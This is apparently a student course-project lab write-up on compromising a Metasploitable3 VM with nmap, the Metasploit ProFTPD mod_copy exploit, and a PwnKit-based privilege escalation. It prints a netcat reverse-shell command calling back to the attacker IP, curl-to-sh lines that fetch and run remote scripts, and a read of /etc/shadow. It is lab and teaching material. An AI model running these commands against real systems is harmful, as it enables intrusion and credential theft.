# 📚 Phase 1: Setup and Compromise the Service

---

## 🛠️ 1. Environment Setup

### 1.1 Import Victim VM (Metasploitable3)

- Downloaded `.ova` file from [SourceForge](https://sourceforge.net/projects/metasploitable3-ub1404upgraded/files/)
- Open VirtualBox → File → Import Appliance
- Customized settings (RAM=2048MB, CPU=2)

**Screenshots:**
- ![1-virtualbox_attacker_machine.png](./screenshots/1-virtualbox_attacker_machine.png)
- ![2-import_appliance_option.png](./screenshots/2-import_appliance_option.png)
- ![3-select_metasploitable3_ova.png](./screenshots/3-select_metasploitable3_ova.png)
- ![4-import_appliance_settings.png](./screenshots/4-import_appliance_settings.png)
- ![5-import_progress.png](./screenshots/5-import_progress.png)

---

### 1.2 Boot the Victim VM

- Started VM with credentials:
  - `username: vagrant`
  - `password: vagrant`

**Screenshot:**
- ![6-metasploitable3_login_success.png](./screenshots/6-metasploitable3_login_success.png)

---

### 1.3 Obtain Victim IP Address

- Victim (Metasploitable3) IP: `10.0.2.15`

**Screenshots:**
- ![7-ifconfig_command.png](./screenshots/7-ifconfig_command.png)
- ![8-victim_ip_found.png](./screenshots/8-victim_ip_found.png)

---

### 1.4 Obtain Attacker IP Address & Confirm Network Connectivity

- Attacker (Kali) IP: `10.0.2.6`
- Pinged victim from attacker:
```bash
ping 10.0.2.15
```

**Screenshot:**
- ![9-kali_ping_success.png](./screenshots/9-kali_ping_success.png)

---

# 💣 2. TASK 1.1: Compromise Service Using Metasploit

---

## 2.1 Scan Victim with Nmap

```bash
nmap -sV 10.0.2.15
```
- Discovered ProFTPD 1.3.5 on port 21

**Screenshot:**
- ![10-nmap_scan_results.png](./screenshots/10-nmap-scan-results.png)

---

## 2.2 Launch Metasploit Console

```bash
sudo msfconsole
```

**Screenshot:**
- ![11-start_msfconsole.png](./screenshots/11-start_msfconsole.png)

---

## 2.3 Search and Use Exploit

```bash
search mod_copy
use 0
```

**Screenshot:**
- ![12-search_and_use_modcopy_exploit.png](./screenshots/12-search_and_use_modcopy_exploit.png)

---

## 2.4 Configure Exploit Options

```bash
set RHOSTS 10.0.2.15
set SITEPATH /var/www/html
```

**Screenshot:**
- ![13-configure_rhosts_sitepath.png](./screenshots/13-configure_rhosts_sitepath.png)

---

## 2.5 Configure Payload and Reverse Shell Command

```bash
set payload 5
set LHOST 10.0.2.6
set LPORT 4444
set CMD /tmp/mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 4444 > /tmp/f
```

**Screenshot:**
- ![14-set_payload_and_reverse_shell_command.png](./screenshots/14-set_payload_and_reverse_shell_command.png)

---

## 2.6 Start Netcat Listener (Terminal A)

```bash
nc -lnvp 4444
```

**Screenshot:**
- ![15-start_nc_listener.png](./screenshots/15-start_nc_listener.png)

---

## 2.7 Run Exploit (Terminal B)

```bash
run
```

**Screenshot:**
- ![16-run_exploit.png](./screenshots/16-run_exploit.png)

---

## 2.8 Confirm Reverse Shell Access

```bash
whoami
ls
```

**Screenshot:**
- ![17-confirm_shell_access.png](./screenshots/17-confirm_shell_access.png)

---

# 🛠️ 3. TASK 1.2: Custom Scripts & Privilege Escalation

---

## 3.1 Run Custom Enumeration Script (lightpeas.sh)

```bash
curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/lightpeas.sh | sh
```

**Screenshot:**
- ![18-run_lightpeas_script.png](./screenshots/18-run_lightpeas_script.png)

---

## 3.2 Execute Custom Privilege Escalation (escalate.sh)

```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/escalate.sh)"
```

**Screenshot:**
- ![19-run_escalate_script.png](./screenshots/19-run_escalate_script.png)

---

## 3.3 Confirm Root Access

```bash
whoami
cat /etc/shadow
```

**Screenshot:**
- ![20-confirm_root_access.png](./screenshots/20-confirm_root_access.png)

---

# 📆 Custom Scripts Used

| Script | Purpose |
|:------|:--------|
| `lightpeas.sh` | Local enumeration script (gather system info) |
| `ExploitRoot.c` | Custom compiled PwnKit-based root exploit |
| `escalate.sh` | Automated script to compile and run ExploitRoot.c |

✅ Located at: `phase1/custom/`

---
